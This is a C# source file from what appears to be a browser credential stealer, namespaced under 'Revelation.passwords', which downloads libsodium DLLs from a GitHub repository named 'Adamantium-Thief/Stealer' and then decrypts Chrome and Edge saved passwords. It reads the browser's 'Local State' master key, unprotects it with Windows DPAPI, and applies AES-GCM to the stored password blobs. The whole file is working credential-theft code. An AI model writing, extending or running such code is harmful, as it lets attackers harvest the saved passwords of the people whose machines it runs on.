using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using Sodium;

namespace Revelation.passwords.utils_chrome_edge
{
    internal class Crypt
    {
        // Check if exists libsodium dll's
        public static void checkDlls()
        {
            string[] dlls = new string[2]
            {
                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll",
                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll"
            };

            foreach (string dll in dlls)
            {
                if (!File.Exists(Path.GetFileName(dll)))
                {
                    try
                    {
                        System.Net.WebClient client = new System.Net.WebClient();
                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Ssl3;
                        client.DownloadFile(dll, Path.GetFileName(dll));
                    }
                    catch (Exception e)
                    {
                        var message = e.Message;
                        Console.WriteLine("Not connected to internet!");
                        Environment.Exit(3);
                    }

                }
            }
        }

        // Decrypt value from Chrome > 80 version.
        public static string decrypt(string password, string browser = "")
        {
            // If Chromium version > 80
            if (password.StartsWith("v10") || password.StartsWith("v11"))
            {
                // Check dll's before decryption chromium passwords
                checkDlls();
                // Get masterkey location
                string masterKey, masterKeyPath = "";
                foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
                {
                    masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
                    if (File.Exists(masterKeyPath))
                    {
                        break;
                    }
                    else
                    {
                        masterKeyPath = null;
                        continue;
                    }
                }

                // Get master key
                masterKey = File.ReadAllText(masterKeyPath);
                masterKey = JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
                // Decrypt master key
                byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
                byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes);
                byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
                // Decrypt password by master-key
                try
                {
                    byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
                    byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
                    string decryptedPassword = Encoding.Default.GetString(SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));


                    return decryptedPassword;

                    // return decryptedPassword;
                }
                catch(Exception e)
                {
                    return "failed(AES - GCM)" + e.Message;
                }


            }
            else
            {
                try
                {
                    return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password)));
                }
                catch
                {
                    return "failed (DPAPI)";
                }

            }
        }

        // Convert 1251 to UTF8
        public static string GetUTF8(string text)
        {
            Encoding utf8 = Encoding.GetEncoding("UTF-8");
            Encoding win1251 = Encoding.GetEncoding(1251);

            byte[] utf8Bytes = win1251.GetBytes(text);
            byte[] win1251Bytes = Encoding.Convert(utf8, win1251, utf8Bytes);

            return win1251.GetString(win1251Bytes);
        }

    }
}
